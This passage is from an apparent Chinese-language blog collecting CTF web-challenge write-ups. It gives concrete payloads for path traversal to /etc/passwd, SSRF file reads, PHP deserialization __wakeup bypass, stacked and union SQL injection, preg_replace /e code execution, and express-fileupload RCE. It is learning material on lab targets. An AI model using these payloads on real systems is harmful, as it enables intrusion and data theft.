+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);      </span><br><span class="line"><span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(		//截取file参数的<span class="number">0</span>到第一个问号的字符串        </span><br><span class="line">    <span class="variable">$_page</span>,        </span><br><span class="line">    <span class="number">0</span>,        </span><br><span class="line">    <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)  //参数末尾拼接一个问号，再查找问号的位置    </span><br><span class="line">);      </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;        </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;      </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>include特性：即使是不规范的路径也能尝试解析。如果按照include_path+传递的路径找不到这个文件，就会检测点号作为相对路径的起始值。</strong></p>
+<p>构造<code>?file=hint.php?../../../../../../../../etc/passwd</code>，<code>hint.php?</code>用来绕过白名单，include找不到<code>hint.php?../../../../../../../../etc/passwd</code>，所以从点号开始解析相对路径<code>../../../../../../../../etc/passwd</code>，利用路径遍历。<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230922215112348.png" alt="image-20230922215112348"></p>
+<p>已知flag文件名，一般猜测在当前目录下或者父目录下或者根目录下。</p>
+<p>总结：php代码审计、白名单、文件包含、目录遍历</p>
+<h2 id="Cat"><a href="#Cat" class="headerlink" title="Cat"></a>Cat</h2><p>一眼SSRF（刷题还是有用的），主要是场景太熟悉了。</p>
+<p>直接尝试127.0.0.1，可知是执行了ping操作，根据响应头判断操作系统为Ubuntu。<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230922220054669.png" alt="image-20230922220054669"></p>
+<p>尝试利用管道符，报错Invalid URL。利用burp intruder模块<strong>FUZZ测试</strong>过滤了哪些关键符号，根据测试结果，有用的符号为@（原题目的提示信息讲了@的用法<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230922223205761.png" alt="image-20230922223205761"></p>
+<p><strong>宽字节测试</strong>：%df，得到编码报错信息。（不知道为啥，就当是经验吧）将html部分单独保存为.html文件方便查看，得到django的一些配置信息，所以web服务器调用了本地的django服务。django项目的绝对路径为<code>/opt/api</code> <img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230922231951727.png" alt="image-20230922231951727"></p>
+<p>继续搜索报错信息中的敏感信息，找到sqlite数据库文件地址<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230922232233431.png" alt="image-20230922232233431"></p>
+<p>利用@读取数据库文件<code>url=@/opt/api/database.sqlite3</code><strong>（php中curl+@+文件名可以读取文件）</strong> ，查找结果可以得到flag（tips.可以直接搜索ctf或flag查找），结果是WHCTF{yoooo_Such_A_G00D_@}，不知道为啥没有A<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230922232830677.png" alt="image-20230922232830677"></p>
+<p>总结：ssrf、命令注入fuzz测试、编码报错？、django、sqlite</p>
+<h2 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h2><p><code>__wakeup</code>魔术方法是<code>unserialize</code>的触发方法，猜测与反序列化有关，新建一个xctf对象，获取序列化后的格式：<code>O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code>  （object:对象类名长度:类名:对象属性个数：{string:属性名长度:属性名;string:属性值长度:属性值}）<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230923123201617.png" alt="image-20230923123201617"></p>
+<p>本题中wakeup中存在exit，猜测是绕过exit成功执行反序列化操作。绕过方法：修改属性个数 <code>?code=O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125; </code> <strong>(序列化字符串中表示对象属性个数的值大于真实的属性个数时，wakeup()的执行会被跳过。)</strong><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230923124059108.png" alt="image-20230923124059108"></p>
+<p>总结：php反序列化、wakeup绕过</p>
+<h2 id="supersqli"><a href="#supersqli" class="headerlink" title="supersqli"></a>supersqli</h2><p>页面源码提示：sqlmap是没有灵魂的……好的，开始手工注入。</p>
+<p>单引号报错：<code>?inject=1&#39;</code>，可知是单引号闭合<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230923124635421.png" alt="image-20230923124635421"></p>
+<p>尝试报错注入:<code>?inject=1&#39;&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e))--+</code>，得知过滤条件<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230923125040000.png" alt="image-20230923125040000"></p>
+<p>大小写、注释、双写都绕不过……好的，<strong>直接用sqlmap能跑出东西，但是是假的！！！</strong>，参考网上教程：</p>
+<p><strong>其实是单引号闭合！！报错内容最外面两个单引号不是查询内容里面的</strong></p>
+<p>确定回显的列数：order by</p>
+<p>采用<strong>堆叠查询</strong>：</p>
+<ol>
+<li>show databases;<strong>与sqlmap结果不一样</strong><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230923132929653.png" alt="image-20230923132929653"><ol>
+<li>show tables from <code>supersqli</code>;<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230923132350508.png" alt="image-20230923132350508"><ol>
+<li>show columns from <code>1919810931114514</code>;（<strong>omg，这个NO的意思不是yesno</strong>）<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230923142421369.png" alt="image-20230923142421369"></li>
+<li>show columns from <code>words</code>;</li>
+</ol>
+</li>
+<li>show tables from <code>ctftraining</code>;<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230923133035651.png" alt="image-20230923133035651"><ol>
+<li>use ctftraining;show columns from <code>FLAG_TABLE</code>;</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+<p>读取数据库中内容，三个方法：<a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/108583338">https://blog.csdn.net/rfrder/article/details/108583338</a></p>
+<ol>
+<li><p>handler查询 </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27;;handler `1919810931114514` open;handler `1919810931114514` read first;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230923140427255.png" alt="image-20230923140427255"></p>
+</li>
+<li><p>预编译语句中使用concat绕过过滤</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27;;set @sql=concat(&#x27;</span>sele<span class="string">&#x27;,&#x27;</span>ct `flag` <span class="keyword">from</span> `<span class="number">1919810931114514</span>`<span class="string">&#x27;);PREPARE stmt1 from @sql;EXECUTE stmt1;#</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>根据表结构可知inject参数读取的是words表，因此查询words表的内容是合法操作（开发的源代码里就是对words表的select行为）。</p>
+<ol>
+<li>将words表改名为其他</li>
+<li>将1919810931114514改名为words，将flag列改为id（inject参数查询的where会判断id列</li>
+<li>构造恒为真的查询语句</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;rename tables `words` to `words1`;rename tables `1919810931114514` to `words`; alter table `words` change `flag` `id` varchar(100);#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<p><strong>奇怪的问题增加了，注释符一会儿–+行，一会儿#行</strong></p>
+<p>总结：sql注入、绕过关键字过滤、</p>
+<h2 id="Triangle"><a href="#Triangle" class="headerlink" title="*Triangle"></a>*Triangle</h2><p>审计前端代码，存在login函数，存在secret.js，汇编？？？ARM仿真</p>
+<p>涉及逆向，将寄存器的操作转为代码实现，再见:cry:</p>
+<p>总结：unicorn、逆向</p>
+<h2 id="SSRF-Me"><a href="#SSRF-Me" class="headerlink" title="SSRF Me"></a>SSRF Me</h2><p>题目和URL输入框都提示了SSRF，主要观察captcha，不然会报错Wrong Captcha</p>
+<p>reset：在后端修改了captcha，然后浏览器重新对index发起请求，将其md5值的末尾6位返回到前端。</p>
+<p><strong>captcha的提示是后端判断逻辑，爆破得到一个captcha的md5值的末尾6位满足那个要求就行！</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$captcha</span>=<span class="number">0</span>;	<span class="comment">//一般验证码是数字</span></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$captcha</span>), -<span class="number">6</span>, <span class="number">6</span>) == <span class="string">&quot;3c83b0&quot;</span>)&#123;<span class="comment">//根据当前页面的值</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$captcha</span>;	<span class="comment">//61901</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$captcha</span>++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问127.0.0.1，访问到的应该就是本页面，所以回显后出现了两个一样的。</p>
+<p>成功执行一次后会导致验证码更改……每尝试一次就要改一次？</p>
+<p>使用file协议读取文件，尝试读取根目录下的flag，显示<strong>hacker</strong>，看来是有东西的呀（一切靠猜，经验UP</p>
+<p>双重URL编码绕过：<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230924195451396.png" alt="image-20230924195451396"></p>
+<p>总结：SSRF、验证码爆破、双重URL编码</p>
+<h2 id="ics-05"><a href="#ics-05" class="headerlink" title="ics-05"></a>ics-05</h2><p>把能点的按钮都点一下，只有设备维护中心能打开，显示数据接口请求异常，猜测应该有个API请求，重新加载抓包得到&#x2F;somrthing.json请求，404。</p>
+<p>题目描述中提到了这个系统存在后门，目录扫描一下，dirb扫到&#x2F;server-status（403），<strong>还有目录，有些静态目录里面可能存在一些东西</strong></p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230926162105926.png" alt="image-20230926162105926"></p>
+<p>存在js和css目录，这次的没什么用。</p>
+<p><strong>page参数可以回显（index.php的参数，刚点进维护中心的时候会出现），猜测有文件包含</strong>（？？？挺秃然）</p>
+<p>利用php:&#x2F;&#x2F;filter读取index.php的源码<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230926170258991.png" alt="image-20230926170258991"></p>
+<p>base64解码index.php，提取php代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">@<span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">posix_setuid</span>(<span class="number">1000</span>);</span><br><span class="line"><span class="variable">$page</span> = <span class="variable">$_GET</span>[page];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">ctype_alnum</span>(<span class="variable">$page</span>)) &#123;<span class="comment">//检查字符串是否由字母和数字字符组成</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$page</span>; <span class="keyword">die</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//php伪协议过滤</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$page</span>, <span class="string">&#x27;input&#x27;</span>) &gt; <span class="number">0</span>) &#123;<span class="comment">//php://input</span></span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$page</span>, <span class="string">&#x27;ta:text&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$page</span>, <span class="string">&#x27;text&#x27;</span>) &gt; <span class="number">0</span>) &#123;<span class="comment">//data://text/plain</span></span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$page</span> === <span class="string">&#x27;index.php&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Ok&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="keyword">include</span>(<span class="variable">$page</span>);<span class="comment">//文件包含</span></span><br><span class="line">            <span class="keyword">die</span>();        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] === <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;<span class="comment">//会判断X-Forwarded-For请求头的内容</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="variable">$_GET</span>[pat];<span class="comment">//正则表达式</span></span><br><span class="line">    <span class="variable">$replacement</span> = <span class="variable">$_GET</span>[rep];<span class="comment">//替换内容</span></span><br><span class="line">    <span class="variable">$subject</span> = <span class="variable">$_GET</span>[sub];<span class="comment">//用户输入内容</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$pattern</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$replacement</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$subject</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$pattern</span>, <span class="variable">$replacement</span>, <span class="variable">$subject</span>);<span class="comment">//正则替换</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>&#x2F;e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码</strong>，执行ls命令（注意一些特殊字符需要url编码），找到一些可疑文件<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230926172447403.png" alt="image-20230926172447403"></p>
+<p>深入s3chahahaDir文件夹找到flag.php，cat内容得到flag<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230926172725080.png" alt="image-20230926172725080"></p>
+<p>总结：文件包含、preg_replace() rce漏洞</p>
+<h2 id="BadProgrammer"><a href="#BadProgrammer" class="headerlink" title="BadProgrammer"></a>BadProgrammer</h2><p>看起来是个UI组件库，啥也点不了，dirmap和dirb扫描了以下无处下手……</p>
+<p><strong>目录扫描要多尝试工具……dirsearch能扫到static..&#x2F;</strong></p>
+<p>app.js中提示flag的路由<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230924204230277.png" alt="image-20230924204230277"></p>
+<p>利用burp修改请求方式和路径，提示flag.txt<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230924204124599.png" alt="image-20230924204124599"></p>
+<p><strong>app.js中存在fileupload，看着像突破点（又开始猜了），搜索express-fileupload的漏洞，找到一个cve</strong></p>
+<p>CVE-2020-7699 原理：<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/246029.html">CVE-2020-7699漏洞分析 - FreeBuf网络安全行业门户</a>，没懂这题在哪里调用了有缺陷的函数。</p>
+<p>要求1：express-fileupload&lt;1.1.8，查看package.json可知满足要求。<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230924205356049.png" alt="image-20230924205356049"></p>
+<p>要求2：parseNested为true，查看app.js，满足要求<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230924205620452.png" alt="image-20230924205620452"></p>
+<p>构造POST请求和body内容，内容为上传文件的格式，实现远程命令执行，由于没有直接的回显，选择将flag.txt文件移动到可以直接访问的路径<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230924215229101.png" alt="image-20230924215229101"></p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230924215553269.png" alt="image-20230924215553269"></p>
+<p>总结：目录扫描、原型链污染、express-fileupload</p>
+<p><strong>主要是学习发现漏洞的思路，原理以后再说……</strong></p>
+<h2 id="NewCenter"><a href="#NewCenter" class="headerlink" title="NewCenter"></a>NewCenter</h2><p>搜索框单引号会报错500，可确定存在sql注入，有回显，用union注入。</p>
+<ol>
+<li><code>search=1&#39; order by 1#</code>，通过order by判断列数，当试到4时报500错误，可知应该是返回3列</li>
+<li><code>search=-1&#39; union select 1,2,3#</code>，判断回显的位置为2，3<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230924220938714.png" alt="image-20230924220938714"></li>
+<li><code>search=-1&#39; union select 1,database(),3#</code>，查当前数据库：news</li>
+<li><code>search=-1&#39; union select 1,group_concat(schema_name),3 from information_schema.schemata#</code>，查所有数据库</li>
+<li><code>search=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;news&#39;#</code>，查news数据库的所有表：news,secret_table</li>
+<li><code>search=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;secret_table&#39;#</code>，查secret_table表的列名：id,fl4g</li>
+<li><code>search=-1&#39; union select 1,id,fl4g from secret_table#</code>，读取flag<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230924221812878.png" alt="image-20230924221812878"></li>
+</ol>
+<p>总结：sql注入</p>
+<h2 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff_referer"></a>xff_referer</h2><p>题目提示：伪造xff(X-Forwarded-For)和referer</p>
+<p>限定IP：修改X-Forwarded-For（只是这题的IP检测用的xxf，不适用所有情况</p>
+<p>限定来自什么：修改Referer（用hackbar、burp等修改请求头可得</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230924222708295.png" alt="image-20230924222708295"></p>
+<p>总结：xxf和referer伪造</p>
+<h2 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak_auth"></a>weak_auth</h2><p>题目提示：随手设了个密码，可能有弱口令？</p>
+<p>随便登录一下，提示please login as admin</p>
+<p>用admin作为用户名登录，得到提示maybe you need a dictionary，妥妥的弱密码，找个弱口令字典爆破一下<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230924223234940.png" alt="image-20230924223234940"></p>
+<p>burp自带的password字典居然跑不出来，自己找个top1000字典，筛选长度可以判断是否登录成功<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230924223728188.png" alt="image-20230924223728188"></p>
+<h2 id="wzsc-文件上传"><a href="#wzsc-文件上传" class="headerlink" title="*wzsc_文件上传"></a>*wzsc_文件上传</h2><p>尝试上传正常图片和php一句话木马，无任何回显……</p>
+<p>尝试访问&#x2F;upload&#x2F;居然成功了（实在不行目录扫描也可以扫出来），可以看到正常图片上传成功而php没有。</p>
+<p>尝试一些常见的后缀和不可识别的后缀，感觉是文件后缀白名单过滤。解析漏洞用不了。</p>
+<p>随便搜搜apache文件上传漏洞竟然能搜到cve！CVE-2017-15715，打扰了，适用于黑名单过滤。</p>
+<p>fuzz试试：<a target="_blank" rel="noopener" href="https://github.com/TheKingOfDuck/fuzzDicts/blob/master/uploadFileExtDicts/php_upload_fuzz.txt">https://github.com/TheKingOfDuck/fuzzDicts/blob/master/uploadFileExtDicts/php_upload_fuzz.txt</a> 失败</p>
+<p>别人有源码审计:cry:</p>
+<p>总结：条件竞争</p>
+<h2 id="file-include"><a href="#file-include" class="headerlink" title="-file_include"></a>-file_include</h2><p>根据源码提示尝试用filename参数读取文件<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230926145130781.png" alt="image-20230926145130781"></p>
+<p>利用php伪协议查看check.php的源码<code>?filename=php://filter/read=convert.base64-encode/resource=./check.php</code>，出现报错信息do not hack，看来是有东西的。可能是对某个部分进行了过滤，逐步删除各关键词进行测试，应该是对<code>read=convert.base64-encode</code>这里有过滤。</p>
+<p>使用php:&#x2F;&#x2F;input和data协议均无回显。</p>
+<p><strong>爆破convert支持的其他协议</strong></p>
+<p>总结：文件包含、php伪协议</p>
+<h2 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h2><p>大大的logo：ThinkPHP V5.0，再加上题目名称提示rce直接搜这个框架的rce。<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44862511/article/details/132132998">thinkphp 5-rce版本漏洞复现(超详细版)_thinkphp5漏洞扫描_徐长卿学网安的博客-CSDN博客</a></p>
+<p>直接实现命令执行</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230926174132713.png" alt="image-20230926174132713"></p>
+<p>猜测flag在根目录下（也可以写入webshell连接后去翻文件）<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230926174326671.png" alt="image-20230926174326671"></p>
+<p>总结：thinkphp5 rce（原理不懂，但看起来很好用）</p>
+<h2 id="ez-curl"><a href="#ez-curl" class="headerlink" title="-ez_curl"></a>-ez_curl</h2><p>审计页面php源码：需要了解一下关联数组</p>
+<ul>
+<li>需要POST，body为json数据，有headers和params两个参数</li>
+<li>headers中不能有<code>admin:true</code></li>
+<li>params与既有的url进行拼接，向本地3000端口的服务发起请求</li>
+</ul>
+<p>审计附件中的app.js：就是3000端口的nodejs服务</p>
+<ul>
+<li>需要admin参数不为false</li>
+<li>headers中要有admin为true</li>
+</ul>
+<p>绕过：</p>
+<ul>
+<li><strong>由于express的parameterLimit默认为1000，即参数最大限制为1000</strong>，写脚本请求加上1000个参数就能成功把拼接的&amp;admin&#x3D;flase挤掉，</li>
+<li>headers判断时，<strong>header name的第一个字符为空格会被判断为非法字符</strong>，但是nodejs会将<code>&#123;&quot;headers&quot;: [&quot;admin: x&quot;, &quot; true: y&quot;]&#125;</code>解析为<code>&#123;&quot;admin&quot;: &quot;x true y&quot;&#125;</code>（true前面有个空格）</li>
+</ul>
+<p>总结：HTTP header绕过、URL参数绕过</p>
+<h2 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a>Web_php_unserialize</h2><p>审计页面源码：</p>
+<ol>
+<li>var参数要进行base64加密</li>
+<li>提示flag在fl4g.php</li>
+<li>会正则判断变量<code>/[oc]:\d+:/i</code>（控制对象的序列化数据就是O开头的……</li>
+<li>会执行反序列化操作，会触发wakeup函数，会判断file参数是否合法</li>
+</ol>
+<p>绕过：</p>
+<ol>
+<li>绕过正则：将<code>O:4</code>替换为<code>O:+4</code></li>
+<li>绕过wakeup：在 PHP5 &lt; 5.6.25， PHP7 &lt; 7.0.10 的版本存在wakeup的漏洞。当反序列化中object（对象）的实际个数和声明的个数不等时，wakeup就会<strong>被略过不执行</strong>。</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$var</span> = <span class="string">&quot;fl4g.php&quot;</span>;</span><br><span class="line"><span class="variable">$d</span>=<span class="keyword">new</span> <span class="title class_">Demo</span>(<span class="variable">$var</span>);</span><br><span class="line"><span class="variable">$s</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$d</span>);<span class="comment">//获取序列化字符串</span></span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:4&#x27;</span>, <span class="string">&#x27;O:+4&#x27;</span>,<span class="variable">$s</span>);<span class="comment">//绕过preg_match</span></span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;:1:&#x27;</span>, <span class="string">&#x27;:2:&#x27;</span>,<span class="variable">$s</span>);<span class="comment">//绕过wakeup</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$s</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230927211317024.png" alt="image-20230927211317024"></p>
+<p>总计：php反序列化、wakeup漏洞、</p>
+<h2 id="FlatScience"><a href="#FlatScience" class="headerlink" title="-FlatScience"></a>-FlatScience</h2><p>目录扫描，存在robots.txt，查看得到隐藏路径：&#x2F;login.php和&#x2F;admin.php。</p>
+<p>login.php页面源码中有提示隐藏参数debug<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230927222419314.png" alt="image-20230927222419314"></p>
+<p>尝试get、post、debug、debug-Parameter，当get请求login.php并传参debug时会返回源码，得到数据库fancy.db和sql查询方式<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230927223339502.png" alt="image-20230927223339502"></p>
+<p>尝试sql注入，单引号闭合，成功登录（通过是否有set-cookie判断）<strong>sqlite3的注释符与mysql不太一样，是<code>--</code>和<code>/**/</code></strong><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230927230919793.png" alt="image-20230927230919793"></p>
+<p>order by判断列数，有报错显示应该是2列，还有绝对路径<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230927231454928.png" alt="image-20230927231454928"></p>
+<p>union注入查看回显位置→第二列回显到cookie中（结果为url编码<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230927231637462.png" alt="image-20230927231637462"></p>
+<p><strong>sqlite中sqlite_master库存储数据库信息，类似mysql的information_schema）</strong></p>
+<p>查询数据库名name字段：<code>usr=-1&#39; union select 2,group_concat(name) from sqlite_master--&amp;pw=</code>，得到Users表<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230927232429600.png" alt="image-20230927232429600"></p>
+<p>查看建表语句sql字段：<code>usr=-1&#39; union select 2,group_concat(sql) from sqlite_master--</code>，得到User表的列名：id,name,password,<strong>hint</strong><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230927232815390.png" alt="image-20230927232815390"></p>
+<p>查询hint字段的内容：<code>usr=-1&#39; union select 2,group_concat(hint) from Users--</code>，解码得到 my fav word in my fav paper?!,my love is…?,the password is password</p>
+<p>看到paper联想到最开始index.html的一堆pdf，<strong>密码是pdf中的某个单词，提取单词进行sha1爆破，sha1加密的key在login.php源码中有</strong></p>
+<p>总结：sql注入、sqlite3</p>
+<h2 id="easy-web"><a href="#easy-web" class="headerlink" title="easy_web"></a>easy_web</h2><p>场景：字符规范器，将具有格式的字符转为普通utf-8编码</p>
+<p>在参数中随便加个单引号竟然发现了报错信息<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230928131935998.png" alt="image-20230928131935998"></p>
+<p>对特殊符号进行模糊测试，发现过滤了大括号和引号，会不会是模板注入？</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230928132154633.png" alt="image-20230928132154633"></p>
+<p>观察响应头，存在<code>Server: Werkzeug/2.0.2 Python/3.7.12</code>，看到python更加觉得是SSTI了，搜一搜Werkzeug模板注入，<strong>Flask 框架就是以Werkzeug 为基础开发</strong>，但是绕不过大括号过滤……</p>
